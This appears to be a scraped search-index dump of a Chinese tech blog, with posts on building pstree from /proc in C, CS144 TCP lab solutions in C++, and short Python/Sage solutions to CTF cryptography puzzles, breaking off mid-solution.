数组的下标为进程的 PID. 最大值为内核定义的最大 PID, 这个值定义在 /proc/sys/kernel/pid_max, 需要注意的是在不同的内核版本中可能不同. 例如在较早的内核版本中, 这个值为 32768. // MAX PID defined in /proc/sys/kernel/pid_max #define MAX 4194304 node *Tree[MAX] = {NULL}; ","date":"2023-09-18","objectID":"/build_your_own_pstree/:3:1","tags":["build_your_own","pstree"],"title":"Build_your_own_pstree","uri":"/build_your_own_pstree/"},{"categories":["build_your_own"],"content":"3.2. 从内核获取进程信息 首先我们要介绍 /proc 目录. /proc 目录是 Linux 系统中的一个特殊目录, 它提供了对运行中进程和系统内核的访问. 它是一个虚拟文件系统, 其中的文件和目录并不在磁盘上实际存在, 而是由内核在运行时动态生成的. /proc 目录下的文件和目录提供了对系统状态和进程信息的实时访问. 于是通过对 /proc 目录的访问, 遍历目录下的所有数字目录, 即可获取系统当前状态的所有进程. func: make_tree 用于遍历 /proc 目录, 并获取所有进程的信息. void make_tree(node *Tree[]) { Tree[0] = (node *)malloc(sizeof(node)); Tree[0]-\u003ename = (char *)malloc(sizeof(char) * 40); strcpy(Tree[0]-\u003ename, \"root\"); DIR *dp = opendir(\"/proc\"); if (!dp) { fprintf(stderr, \"%s\", \"Can 't open /proc/\"); exit(1); } struct dirent *entry; while ((entry = readdir(dp)) != NULL) { __pid_t pid = atoi(entry-\u003ed_name); read_status(pid, Tree); } } 插播和本次实现没啥关系的小 tips, /proc/self 是一个软链接, 指向当前进程的信息. 可以轻易的获取到当前进程的信息. ","date":"2023-09-18","objectID":"/build_your_own_pstree/:3:2","tags":["build_your_own","pstree"],"title":"Build_your_own_pstree","uri":"/build_your_own_pstree/"},{"categories":["build_your_own"],"content":"3.3. 从内核获取进程树 然后介绍 /proc/[pid]/stat 文件, 这一文件保存了进程的状态信息. /proc/[pid]/stat 文件的内容如下: pid：进程ID comm：进程的命令名 state：进程的状态 ppid：父进程的进程ID pgrp：进程组的进程ID session：会话的进程ID tty_nr：与进程关联的终端设备号 tpgid：进程所属的前台进程组ID flags：进程的标志位 minflt：不需要从磁盘加载页面的次数（次缺页错误） cminflt：在进程的子进程中不需要从磁盘加载页面的次数（次缺页错误） majflt：需要从磁盘加载页面的次数（主缺页错误） cmajflt：在进程的子进程中需要从磁盘加载页面的次数（主缺页错误） utime：进程在用户态运行的时间（时钟滴答数） stime：进程在内核态运行的时间（时钟滴答数） cutime：进程的所有已死亡的子进程在用户态运行的时间（时钟滴答数） cstime：进程的所有已死亡的子进程在内核态运行的时间（时钟滴答数） priority：进程的调度优先级 nice：进程的静态优先级 num_threads：进程所拥有的线程数 itrealvalue：下一个计时器中的值 starttime：进程启动时的时钟滴答数 vsize：虚拟内存大小（字节） rss：常驻内存集大小（页面数） rsslim：进程的常驻内存集大小的限制（字节） startcode：可执行代码的起始地址 endcode：可执行代码的结束地址 startstack：栈的起始地址 kstkesp：当前栈指针（ESP） kstkeip：当前指令指针（EIP） signal：挂起的信号位图 blocked：阻塞的信号位图 sigignore：忽略的信号位图 sigcatch：捕获的信号位图 wchan：进程正在等待的地址 nswap：交换出的页面数 cnswap：在进程的子进程中交换出的页面数 exit_signal：进程终止时发送给父进程的信号 processor：执行进程的处理器ID rt_priority：实时优先级 policy：调度策略 delayacct_blkio_ticks：块IO延迟账户时钟滴答数 guest_time：虚拟CPU时间（以时钟滴答数为单位） cguest_time：在进程的子进程中的虚拟CPU时间（以时钟滴答数为单位） start_data：数据段的起始地址 end_data：数据段的结束地址 start_brk：堆的起始地址 arg_start：命令行参数的起始地址 arg_end：命令行参数的结束地址 env_start：环境变量的起始地址 env_end：环境变量的结束地址 exit_code：进程的退出状态 本次实现我们只需要获取进程的父进程 PID 和进程名. 通过读取 /proc/[pid]/stat 文件即可. 为了构建进程树, 我们需要递归的获取父进程的信息直到父进程为 0, 即 root 进程. 然后为了防止重复遍历, 我们检验了指针是否为空. func: read_status 用于获取进程的信息, 并递归的获取父进程的信息. void read_status(__pid_t pid, node *Tree[]) { if (Tree[pid] != NULL) { return; } Tree[pid] = (node *)malloc(sizeof(node)); Tree[pid]-\u003ename = (char *)malloc(sizeof(char) * 40); char *processpath = (char *)malloc(sizeof(char) * 20); sprintf(processpath, \"/proc/%d/stat\", pid); FILE *fp = fopen(processpath, \"r\"); if (fp == NULL) { fprintf(stderr, \"Can 't open %s\\n\", processpath); free(processpath); exit(1); } char i; __pid_t _pid, ppid; char pname[40]; fscanf(fp, \"%d (%s %c %d\", \u0026_pid, pname, \u0026i, \u0026ppid); pname[strlen(pname) - 1] = '\\0'; strcpy(Tree[pid]-\u003ename, pname); assert(pid == _pid); Tree[pid]-\u003epid = pid; Tree[pid]-\u003eppid = ppid; fclose(fp); free(processpath); read_status(ppid, Tree); if (Tree[ppid]-\u003echild == NULL) { Tree[ppid]-\u003echild = Tree[pid]; } else { node *bro = Tree[ppid]-\u003echild; while (bro-\u003enext != NULL) { bro = bro-\u003enext; } bro-\u003enext = Tree[pid]; } } ","date":"2023-09-18","objectID":"/build_your_own_pstree/:3:3","tags":["build_your_own","pstree"],"title":"Build_your_own_pstree","uri":"/build_your_own_pstree/"},{"categories":["build_your_own"],"content":"3.4. 打印进程树 打印进程树则比较简单, 进行一个记录深度的 DFS 即可. 为了美观, 我们使用了制表符 └─ 和 ├─ 进行分割. 并因此需要记录当前进程是否为父进程的最后一个子进程. 判断方法是 Tree[child-\u003epid]-\u003enext == NULL. func: print_tree 用于打印进程树. void print_tree(node *Tree[], int pid, int depth, int last_child) { for (int i = 0; i \u003c depth; i++) { if (i == depth - 1) { if (last_child) { printf(\"└─\"); } else { printf(\"├─\"); } } else { printf(\"│ \"); } } printf(\"%s (%d)\\n\", Tree[pid]-\u003ename, pid); node *child = Tree[pid]-\u003echild; while (child != NULL) { print_tree(Tree, child-\u003epid, depth + 1, Tree[child-\u003epid]-\u003enext == NULL); child = child-\u003enext; } } ","date":"2023-09-18","objectID":"/build_your_own_pstree/:3:4","tags":["build_your_own","pstree"],"title":"Build_your_own_pstree","uri":"/build_your_own_pstree/"},{"categories":["build_your_own"],"content":"3.5. 运行结果 不要忘记释放内存喵. figure-2 mypstree ","date":"2023-09-18","objectID":"/build_your_own_pstree/:3:5","tags":["build_your_own","pstree"],"title":"Build_your_own_pstree","uri":"/build_your_own_pstree/"},{"categories":["build_your_own"],"content":"4. 总结 build_your_own 系列的第一篇就到这里了. 这次实现比较简单, 希望能坚持下去不要咕咕咕 (逃 ","date":"2023-09-18","objectID":"/build_your_own_pstree/:4:0","tags":["build_your_own","pstree"],"title":"Build_your_own_pstree","uri":"/build_your_own_pstree/"},{"categories":["Project"],"content":"很早就听闻 CS144 Lab 的大名, 但是由于各种原因一直没有上手实践. 直到最近才开始着手实践, 本文将记录我在实践过程中的一些笔记. 由于本次实验和博客是并行进行的, 所以已经编辑公开的部分也可能会出现部分差错以及可能导致的多次修改. 我的仓库在 4ever-xxxl/CS144-Computer-Network . ","date":"2023-08-15","objectID":"/cs144_computer_network/:0:0","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab 笔记 (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"环境搭建 ","date":"2023-08-15","objectID":"/cs144_computer_network/:1:0","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab 笔记 (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"运行环境 本次环境基于官方镜像 VirtualBox 搭建, 镜像文件以及搭建教程可以在 这里 找到. VirtualBox 启动后照常配置, 使用 Vscode 远程连接到虚拟机, Vscode 中配置插件 C/C++ GitLens, 之后的实验都在 Vscode 中进行. 运行 setup_dev_env.sh 配置实验所需环境. 之后 git clone 仓库, 我使用的仓库是 PKUFlyingPig/CS144-Computer-Network , 再按照 README.md 配置即可. 这里有个坑就是由于缺失了 \u003carray\u003e \u003cstdexcept\u003e 两个文件头导致执行 make 时会报错, 需要在对应文件手动补上. (我也不是很理解为什么三年前的高星仓库 clone 下来不能直接用. figure-1 error ","date":"2023-08-15","objectID":"/cs144_computer_network/:1:1","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab 笔记 (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"测试环境 为了便于调试并且不影响 Release 版本测速, 我在实验目录下新建了 Debug 目录, 使用 cmake .. -DCMAKE_BUILD_TYPE=Debug 生成 Debug 版本的可执行文件. Vscode 使用的测试配置文件如下: launch.json { \"version\": \"0.2.0\", \"configurations\": [ { \"name\": \"CS144Lab debug\", \"type\": \"cppdbg\", \"request\": \"launch\", \"program\": \"${workspaceFolder}/CS144-Computer-Network/Debug/tests/${fileBasenameNoExtension}\", //!设置为测试程序源码相对应的目标程序路径 \"args\": [], \"stopAtEntry\": false, \"cwd\": \"${workspaceFolder}\", \"environment\": [], \"externalConsole\": false, \"MIMode\": \"gdb\", \"setupCommands\": [ { \"description\": \"为 gdb 启用整齐打印\", \"text\": \"-enable-pretty-printing\", \"ignoreFailures\": true } ], \"miDebuggerPath\": \"/usr/bin/gdb\" } ] } 但是这种情况下还是没办法愉快的调试, 因为 DEBUG 的编译参数是 -Og, 还是会导致部分变量出现 OPTIMIZEOUT 的情况. 因此我们需要修改 /etc/cflags.cmake 文件, 将 -Og 改成 -O0 . 接下来就可以愉快的调试啦. ","date":"2023-08-15","objectID":"/cs144_computer_network/:1:2","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab 笔记 (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"Lab_0 ","date":"2023-08-15","objectID":"/cs144_computer_network/:2:0","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab 笔记 (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"Writing webget 编写 get_URL 函数简略实现应用层 HTTP 请求响应的功能, 即使用 socket 向指定 IP 和 Path 发送 GET 请求并获取响应. void get_URL(const string \u0026host, const string \u0026path) { TCPSocket sock{}; sock.connect(Address(host,\"http\")); sock.write(\"GET \"+path+\" HTTP/1.1\\r\\n\"); sock.write(\"Host: \"+host+\"\\r\\n\"); sock.write(\"Connection: close\\r\\n\\r\\n\"); while (!sock.eof()) { cout\u003c\u003csock.read(); } sock.close(); } 这里同样有个坑就是如果主机开了代理并且开了 TUN 模式, 那么 sock.shutdown(SHUT_WR); 会导致异常退出. 具体原因还不是很清楚. ","date":"2023-08-15","objectID":"/cs144_computer_network/:2:1","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab 笔记 (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"An in-memory reliable byte stream 编写一个循环字节流类, 需要向 _buffeer 中写入和读取数据, 其中读取部分分成了两步, 先复制再弹出. 代码如下 byte_stream.hh #include \u003cdeque\u003e class ByteStream { private: size_t _capacity = 0; size_t _read_count = 0; size_t _write_count = 0; std::deque\u003cchar\u003e _buffer = {}; bool _eof = false; bool _error = false; // ... } byte_stream.cc ByteStream::ByteStream(const size_t capacity) : _capacity(capacity) {} size_t ByteStream::write(const string \u0026data) { size_t len = std::min(data.length(), remaining_capacity()); for (size_t i = 0; i \u003c len; i++) { _buffer.emplace_back(data[i]); } _write_count += len; return len; } string ByteStream::peek_output(const size_t len) const { size_t peekLen = std::min(len, buffer_size()); return string().assign(_buffer.begin(), _buffer.begin() + peekLen); } void ByteStream::pop_output(const size_t len) { size_t popLen = std::min(len, buffer_size()); for (size_t i = 0; i \u003c popLen; i++) { _buffer.pop_front(); } _read_count += popLen; } std::string ByteStream::read(const size_t len) { std::string readStream = ByteStream::peek_output(len); ByteStream::pop_output(len); return readStream; } void ByteStream::end_input() { _eof = true; } bool ByteStream::input_ended() const { return _eof; } size_t ByteStream::buffer_size() const { return _buffer.size(); } bool ByteStream::buffer_empty() const { return _buffer.size() == 0; } bool ByteStream::eof() const { return buffer_empty() \u0026\u0026 input_ended(); } size_t ByteStream::bytes_written() const { return _write_count; } size_t ByteStream::bytes_read() const { return _read_count; } size_t ByteStream::remaining_capacity() const { return _capacity - buffer_size(); } ","date":"2023-08-15","objectID":"/cs144_computer_network/:2:2","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab 笔记 (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"Lab_1 ","date":"2023-08-15","objectID":"/cs144_computer_network/:3:0","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab 笔记 (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"stream_reassembler 编写一个流重组器, 用于将乱序的数据流重组成有序的数据流. 这个 lab 的难点在于乱序数据流的合并以及数据流结尾的边界问题. 对于乱序数据流, 我采用 deque 来进行存储, 用 _buffer 存储数据, _bitmap 存储数据是否已经被写入. 当数据流到来时, 先根据前后边界进行裁剪. 前边界为第一个未按序的字节序号, 后边界由缓冲区大小限制. 然后顺序扫一遍, 将数据写入 _buffer 未存储的位置, 即 _bitmap 为 false 的位置, 并将其置真. 最后顺序检查 _bitmap , 将已经按序的头部数据弹出并写入 _output 中. 这里的实现并没有采用 set 等树型数据结构, 而是在双端队列中顺序存储. 虽然实现简单, 但是时间复杂度是 $O(n)$ 的, 理论上部分环节是可以达到 $O(\\log n)$ 的, 留个坑等后面再改进吧. 然后是数据流结尾的边界问题, 只有当数据流结尾到来并且都能被写入时, 才能记录下 _eof 信号, 否则会导致数据流结尾的数据丢失. 这时结尾前可能仍然是乱序状态, 因此需要等待所有乱序数据排列完并写入后才能将 _output 关闭. check_lab1 的运行时间在 0.75~0.85s 左右. stream_reassembler.hh class StreamReassembler { private: // Your code here -- add private members as necessary. std::deque\u003cchar\u003e _buffer = {}; std::deque\u003cbool\u003e _bitmap = {}; size_t _first_unassembled_idx = 0; size_t _unassembled_bytes_num = 0; bool _eof = false; ByteStream _output; //!\u003c The reassembled in-order byte stream size_t _capacity; //!\u003c The maximum number of bytes // ... } stream_reassembler.cc StreamReassembler::StreamReassembler(const size_t capacity) : _buffer(capacity, '\\0'), _bitmap(capacity, false), _output(capacity), _capacity(capacity) {} void StreamReassembler::push_substring(const string \u0026data, const size_t index, const bool eof) { if (eof \u0026\u0026 _first_unassembled_idx + _capacity - _output.buffer_size() \u003e= index + data.length()) { _eof = true; } size_t front_boundary = std::max(index, _first_unassembled_idx); size_t back_boundary = std::min(index + data.length(), _first_unassembled_idx + _capacity - _output.buffer_size()); for (size_t i = front_boundary; i \u003c back_boundary; i++) { if (_bitmap[i - _first_unassembled_idx]) { continue; } _buffer[i - _first_unassembled_idx] = data[i - index]; _bitmap[i - _first_unassembled_idx] = true; _unassembled_bytes_num++; } std::string _str = \"\"; while (_bitmap.front()) { _str += _buffer.front(); _buffer.pop_front(); _bitmap.pop_front(); _buffer.push_back('\\0'); _bitmap.push_back(false); } _output.write(_str); _first_unassembled_idx += _str.length(); _unassembled_bytes_num -= _str.length(); if (_eof \u0026\u0026 empty()) { _output.end_input(); } } size_t StreamReassembler::unassembled_bytes() const { return _unassembled_bytes_num; } bool StreamReassembler::empty() const { return unassembled_bytes() == 0; } size_t StreamReassembler::ack_idx() const { return _first_unassembled_idx; } bool StreamReassembler::input_ended() const { return _eof \u0026\u0026 empty(); } ","date":"2023-08-15","objectID":"/cs144_computer_network/:3:1","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab 笔记 (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"Lab_2 ","date":"2023-08-15","objectID":"/cs144_computer_network/:4:0","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab 笔记 (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"wrapping_integers 编写一个包装整数类, 用于实现序列号的加减法. 实现 WrappingInt32 和 uint64_t 两个类之间的转换函数. 这里的实现很简单, 对于绝对序列号转化成序列号, 只需要加上基准偏移量 isn 即可, 同时由于序列号自动取模了, 因此不需要其他操作. 对于序列号转化成绝对序列号, 想要找到离 checkpoint 最近的绝对序列号. 首先注意到有以下式子成立: $$ \\begin{aligned} \\text{checkpoint} \u0026= \\text{n} - \\text{isn} + k * 2^{32} + \\text{remainder}\\ \\end{aligned} $$ 其中 k 为任意整数, remainder 为余数. 通过比较 2 * remainder 和 1 \u003c\u003c 32 的大小, 就可以决定应该靠近哪一边. 计算绝对序列号时应该取 k 还是 k+1. 但是这里有个坑, 就是当 checkpoint \u003c remainder 时, 会导致算出的值小于 0, 但是我们绝对序列号的类型是 uint64_t, 因此会导致溢出. 所以这种情况应该单独处理. wrapping_integers.cc WrappingInt32 wrap(uint64_t n, WrappingInt32 isn) { return isn + uint32_t(n); } uint64_t unwrap(WrappingInt32 n, WrappingInt32 isn, uint64_t checkpoint) { uint64_t res = uint64_t(n - isn); uint64_t RING = 1ul \u003c\u003c 32; if (res \u003e= checkpoint) { uint64_t k = (res - checkpoint) / RING; uint64_t Mod = (res - checkpoint) % RING; if (2ul * Mod \u003e RING \u0026\u0026 checkpoint \u003e= Mod) { res -= (k + 1ul) * RING; } else { res -= k * RING; } } else { uint64_t k = (checkpoint - res) / RING; uint64_t Mod = (checkpoint - res) % RING; if (2ul * Mod \u003e RING) { res += (k + 1ul) * RING; } else { res += k * RING; } } return res; } ","date":"2023-08-15","objectID":"/cs144_computer_network/:4:1","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab 笔记 (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"tcp_receiver 实现 TCP 接收端, 用于接收 TCP 数据包并将其重组成有序的数据流. 需要处理 syn fin 两种特殊数据包, 以及乱序数据包. 首先, 为了便于对 stream_reassembler 的数据调用, 我们新建了两个接口, ack_idx 和 input_ended , 用于获取绝对 ack 序列号和判断是否结束. stream_reassembler.hh //! The expected number of syn in the next segment size_t ack_idx() const; //! \\brief Is the stream_reassembler ending? //! \\returns `true` if stream_reassembler has ended bool input_ended() const; stream_reassembler.cc size_t StreamReassembler::ack_idx() const { return _first_unassembled_idx; } bool StreamReassembler::input_ended() const { return _eof \u0026\u0026 empty(); } 接下来是 tcp_receiver 的实现, 首先是 segment_received 函数, 用于接收数据包并处理. 处理的逻辑如下: 如果在 syn 之前收到数据包, 则直接丢弃. _syn_flag _fin_flag 或等于对应的标志位, 记录是否已经受到过对应的数据包. 如果收到 syn 数据包, 则记录 isn 序列号, 并将 syn 数据包的序列号加一作为下一个期望的序列号. 绝对序列号通过 unwrap 函数转化成序列号, 并调用 stream_reassembler 的 push_substring 函数进行处理. 这里的参数 index 是数据包内容的序列号, 所以需要减一. 然后是 ackno 函数的实现, 略有小坑, 需要判断是否收到过 syn 数据包. 如果收到过, 那么通过绝对序列号计算序列号返回即可; 如果没有收到过, 那么 ackno 应该返回 std::nullopt 而不是 0. ( 为啥不可以返回 0 啊喂 ). PS: 哦由于 syn 数据包有初始偏移量 isn 所以在未收到 syn 数据包时, 绝对序列号应该是 0, 序列号是无法预测的. 所以这里的 ackno 函数应该返回 std::nullopt 而不是 0. window_size 则较为简单, 直接返回 stream_reassembler 的剩余容量即可. check_lab2 的运行时间在 0.90~1.10s 左右. tcp_receiver.hh class TCPReceiver { //! Our data structure for re-assembling bytes. StreamReassembler _reassembler; bool _syn_flag = false; bool _fin_flag = false; size_t _abs_seqno = 0; WrappingInt32 _seqno{0}; WrappingInt32 _isn{0}; //! The maximum number of bytes we'll store. size_t _capacity; // ... } tcp_receiver.cc void TCPReceiver::segment_received(const TCPSegment \u0026seg) { if (!seg.header().syn \u0026\u0026 !_syn_flag) { return; } _syn_flag |= seg.header().syn; _fin_flag |= seg.header().fin; if (seg.header().syn) { _isn = seg.header().seqno; } _seqno = seg.header().seqno + seg.header().syn; _abs_seqno = unwrap(_seqno, _isn, _reassembler.ack_idx()); _reassembler.push_substring(seg.payload().copy(), _abs_seqno - 1, seg.header().fin); } optional\u003cWrappingInt32\u003e TCPReceiver::ackno() const { size_t _abs_ackno = _reassembler.ack_idx() + _syn_flag + _reassembler.input_ended(); if (_abs_ackno \u003e 0) { return wrap(_abs_ackno, _isn); } else { return std::nullopt; } } size_t TCPReceiver::window_size() const { return _capacity - _reassembler.stream_out().buffer_size(); } ","date":"2023-08-15","objectID":"/cs144_computer_network/:4:2","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab 笔记 (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"Lab_3 ","date":"2023-08-15","objectID":"/cs144_computer_network/:5:0","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab 笔记 (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["Project"],"content":"tcp_sender 实现 TCP 发送端, 用于发送 TCP 数据包并接收 ACK 数据包. 主要函数有 fill_window ack_received tick 三个. 下面介绍各个函数的实现逻辑. Function fill_window() figure-2 sending_space 计算接收端当前窗口剩余大小 sending_space, 默认为 1. 计算公式如上图 figure-2 所示. 当 sending_space 大于 0 且未发送 fin 数据包时, 持续发送数据包以填满窗口. 序列号 seqno 为 next_seqno, 下一个待发送数据包的序列号. 如果未发送 syn 数据包, 则设置 header().syn = true, sending_space 减一. 计算能发送的数据包大小并填入 payload() , sending_space 减去数据包大小. 如果 sending_space 大于 0 且数据流结束, 则设置 header().fin = true, sending_space 减一. 检测是否为空数据报, 是则退出函数. 将数据包加入发送队列和超时队列, 并更新 next_seqno 和 bytes_in_flight . 发送数据包, 并检测是否开始计时. 重复 2~9 步骤直到窗口填满或者数据流结束. Function ack_received() 如果收到的 ACK 数据包不在发送队列中, 则退出函数. 更新存储的接收端窗口大小 window_size . 如果收到的 ACK 数据包序列号大于等于超时队列中的序列号, 则将超时队列中的数据包弹出, 并更新 bytes_in_flight 和计时. 重复第 3 步骤直到收到的 ACK 数据包序列号小于超时队列中的序列号或者超时队列为空. 如果有更新队列, 那么重新计时. 如果队列为空, 则停止计时. Function tick() 如果计时器已经停止, 则退出函数. 计算是否超时, 如果没有超时, 则退出函数. 如果超时, 则重传第一个未确认的数据包, 并重新计时. 如果接收方有空余, 那么重传次数 +1, 超时时间翻倍. tcp_sender.hh class TCPSender { private: bool _fin_sent = false; uint64_t _abs_ackno = 0; uint64_t _bytes_in_flight = 0; uint16_t _receiver_window_size = 1; bool _time_running = false; unsigned int _rto = 0; unsigned int _time_elapsed = 0; unsigned int _consecutive_retransmissions = 0; std::queue\u003cTCPSegment\u003e _segments_outstanding{}; // ... } tcp_sender.cc //! \\param[in] capacity the capacity of the outgoing byte stream //! \\param[in] retx_timeout the initial amount of time to wait before retransmitting the oldest outstanding segment //! \\param[in] fixed_isn the Initial Sequence Number to use, if set (otherwise uses a random ISN) TCPSender::TCPSender(const size_t capacity, const uint16_t retx_timeout, const std::optional\u003cWrappingInt32\u003e fixed_isn) : _rto(retx_timeout) , _isn(fixed_isn.value_or(WrappingInt32{random_device()()})) , _initial_retransmission_timeout{retx_timeout} , _stream(capacity) {} uint64_t TCPSender::bytes_in_flight() const { return _bytes_in_flight; } void TCPSender::fill_window() { size_t sending_space = _abs_ackno + (_receiver_window_size != 0 ? _receiver_window_size : 1) - _next_seqno; while (sending_space \u003e 0 \u0026\u0026 !_fin_sent) { TCPSegment seg; seg.header().seqno = next_seqno(); if (_next_seqno == 0) { seg.header().syn = true; sending_space--; } size_t read_size = min(sending_space, TCPConfig::MAX_PAYLOAD_SIZE); seg.payload() = stream_in().read(read_size); sending_space -= seg.payload().size(); if (stream_in().eof() \u0026\u0026 sending_space \u003e 0) { seg.header().fin = true; _fin_sent = true; sending_space--; } if (seg.length_in_sequence_space() == 0) { return; } segments_out().emplace(seg); if (!_time_running) { _time_running = true; _time_elapsed = 0; } _segments_outstanding.push(seg); _next_seqno += seg.length_in_sequence_space(); _bytes_in_flight += seg.length_in_sequence_space(); } } //! \\param ackno The remote receiver's ackno (acknowledgment number) //! \\param window_size The remote receiver's advertised window size void TCPSender::ack_received(const WrappingInt32 ackno, const uint16_t window_size) { _abs_ackno = unwrap(ackno, _isn, _next_seqno); if (_abs_ackno \u003e _next_seqno) { return; } _receiver_window_size = window_size; bool new_ack = false; while (!_segments_outstanding.empty()) { TCPSegment seg = _segments_outstanding.front(); size_t len = seg.length_in_sequence_space(); uint64_t seqno = unwrap(seg.header().seqno, _isn, _next_seqno); if (seqno + len \u003e _abs_ackno) { break; } _segments_outstanding.pop(); _bytes_in_flight -= len; new_ack = true; } if (new_ack) { _rto = _initial_retransmission_timeout; _time_elapsed = 0; _time_running = !_segments_outstanding.empty(); _consecutive_retransmissions = 0; } } //! \\param[in] ms_since_last_tick the number of milliseconds since the last call to this method void TCPSender::tick(const size_t ms_since_last_tick) { if (!_time_running) { return; } _time_elapsed += ms_since_last_tick; if (_time_elapsed \u003e= _rto) { _segments_out.push(_segments_outstanding.front()); if (_receiver_window_size \u003e 0) { _consecutive_retransmissions++; _rto \u003c\u003c= 1; } _time_elapsed = 0; } ","date":"2023-08-15","objectID":"/cs144_computer_network/:5:1","tags":["Project","CS144","Computer Network"],"title":"CS144_Lab 笔记 (lab 0-3)","uri":"/cs144_computer_network/"},{"categories":["CTF"],"content":"摘要：预定一波『来玩洛克王国谢谢喵』的 Crypto 之旅.","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023夏令营_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"『来玩洛克王国谢谢喵』的 Crypto 之旅. ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:0:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023夏令营_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"🌀 cyclic group 题目附件 print(long_to_bytes(pow(c, gmpy2.invert(e, p - 1), p))) ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:1:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023夏令营_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"🦕 cnss娘的代码Ⅰ 题目附件 模互素的线性同余方程组，使用 CRT 即可. print(long_to_bytes(crt(secret,key))) ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:2:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023夏令营_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"🐢 RSA Ⅰ 题目附件 同时知道 p|mask p\u0026mask ,可以很轻易地按位还原出 p. mk = (2 ** 512) -1 p = andp | (mk ^^ mask) \u0026 orp q = n//p phi = (p-1)*(q-1) d = inverse_mod(e,phi) flag = long_to_bytes(pow(c,d,n)) print(flag) ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:3:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023夏令营_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"🐲 cnss娘的代码 Ⅱ 题目附件 离散对数问题，直接求就行. G = GF(p) m = discrete_log(G(h),G(g)) print(long_to_bytes(m)) ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:4:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023夏令营_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"🐳 cnss娘的代码 Ⅲ 题目附件 G = GF(p) u = A.solve_left(v) flag = b\"\" for item in u: flag += long_to_bytes(int(item)) print(flag) ","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:5:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023夏令营_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"🌛 HomoBlock 题目附件 def NotHomoFunction(x,iv,key): return ((x\u003c\u003civ)\u0026MASK1)^((x\u003e\u003eiv)|MASK2)^key 我们先来分析加密过程, NotHomoFunction 在每一轮中实际上换了高 8 位和低 8 位, 然后异或上 key ^ MASK2. 那么每两组密文的异或就是 cipher[i] ^ cipher[i+1] = m[i] ^ m[i+1] 其中 m[i] 中高低 8 位进行了替换. 在这种加密模式下我们知道第一组明文的值, m[0] = bytes_to_long(b\"cnss{I_a\"). 我们就可以还原出整个明文. init = b\"cnss{I_a\" m = [ 0 for i in range(5)] m[0] = bytes_to_long(init) m[0] = ((m[0]\u003c\u003c32)\u0026(0xffffffff00000000)) | ((m[0]\u003e\u003e32)\u0026(0x00000000ffffffff)) for i in range(4): m[i+1] = m[i] ^^ cipher[i] ^^ cipher[i+1] flag = b\"\" for i in range(5): m[i] = ((m[i]\u003c\u003c32)\u0026(0xffffffff00000000)) | ((m[i]\u003e\u003e32)\u0026(0x00000000ffffffff)) flag += long_to_bytes(m[i]) print(flag) 注意\r以下部分是临时更新喵, 暂时没有旁白解释, 请见谅.\r","date":"2023-08-10","objectID":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/:6:0","tags":["CTF","Crypto","Writeup"],"title":"CNSS2023夏令营_Crypto_Writeup","uri":"/cnss2023%E5%A4%8F%E4%BB%A4%E8%90%A5cryptowriteup/"},{"categories":["CTF"],"content":"🐠 ezLFSR 题目附件 lenmask = 2 ** 16 -1 seed = 37285 mask = 46359 